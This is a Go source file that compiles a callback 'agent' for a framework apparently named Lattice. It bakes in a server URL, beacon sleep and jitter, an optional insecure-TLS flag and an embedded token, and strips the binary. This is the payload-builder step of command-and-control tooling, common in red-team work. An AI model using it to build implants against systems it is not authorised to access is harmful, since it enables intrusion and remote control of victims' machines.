package generate

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Request describes an agent bake (remix of ExploitPeek embed+build).
type Request struct {
	ServerURL       string
	OS              string
	Arch            string
	SleepSeconds    uint64
	JitterPercent   uint32
	InsecureTLS     bool
	AgentToken      string
	EmbedAgentToken bool
	OutputName      string
	OutDir          string
	// ModuleRoot is the Lattice repo root (contains go.mod and agent/).
	ModuleRoot string
}

// Result is a built agent artifact.
type Result struct {
	Path   string
	OS     string
	Arch   string
	Size   uint64
	SHA256 string
	Data   []byte
}

// Build compiles the reference agent with ldflags for callback settings.
func Build(ctx context.Context, req Request) (Result, error) {
	goos := strings.ToLower(strings.TrimSpace(req.OS))
	goarch := strings.ToLower(strings.TrimSpace(req.Arch))
	if goos == "" {
		goos = runtime.GOOS
	}
	if goarch == "" {
		goarch = runtime.GOARCH
	}
	server := strings.TrimSpace(req.ServerURL)
	if server == "" {
		return Result{}, fmt.Errorf("server_url is required")
	}
	if req.SleepSeconds == 0 {
		req.SleepSeconds = 5
	}
	if req.JitterPercent > 100 {
		req.JitterPercent = 100
	}
	root := req.ModuleRoot
	if root == "" {
		wd, err := os.Getwd()
		if err != nil {
			return Result{}, err
		}
		root = wd
	}
	outDir := req.OutDir
	if outDir == "" {
		outDir = filepath.Join(root, "data", "generated")
	}
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return Result{}, err
	}

	name := strings.TrimSpace(req.OutputName)
	if name == "" {
		name = fmt.Sprintf("agent-%s-%s-%d", goos, goarch, time.Now().Unix())
	}
	if goos == "windows" && !strings.HasSuffix(strings.ToLower(name), ".exe") {
		name += ".exe"
	}
	outPath := filepath.Join(outDir, name)

	ldflags := []string{
		"-s", "-w",
		fmt.Sprintf("-X github.com/digitizables/lattice/agent/bake.ServerURL=%s", server),
		fmt.Sprintf("-X github.com/digitizables/lattice/agent/bake.SleepSeconds=%d", req.SleepSeconds),
		fmt.Sprintf("-X github.com/digitizables/lattice/agent/bake.JitterPercent=%d", req.JitterPercent),
	}
	if req.InsecureTLS {
		ldflags = append(ldflags, "-X github.com/digitizables/lattice/agent/bake.InsecureTLS=true")
	}
	if req.EmbedAgentToken && req.AgentToken != "" {
		ldflags = append(ldflags, "-X github.com/digitizables/lattice/agent/bake.AgentToken="+req.AgentToken)
	}

	cmd := exec.CommandContext(ctx, "go", "build",
		"-ldflags", strings.Join(ldflags, " "),
		"-o", outPath,
		"./agent/cmd/agent",
	)
	cmd.Dir = root
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return Result{}, fmt.Errorf("go build: %w\n%s", err, string(out))
	}
	data, err := os.ReadFile(outPath)
	if err != nil {
		return Result{}, err
	}
	sum := sha256.Sum256(data)
	return Result{
		Path:   outPath,
		OS:     goos,
		Arch:   goarch,
		Size:   uint64(len(data)),
		SHA256: hex.EncodeToString(sum[:]),
		Data:   data,
	}, nil
}
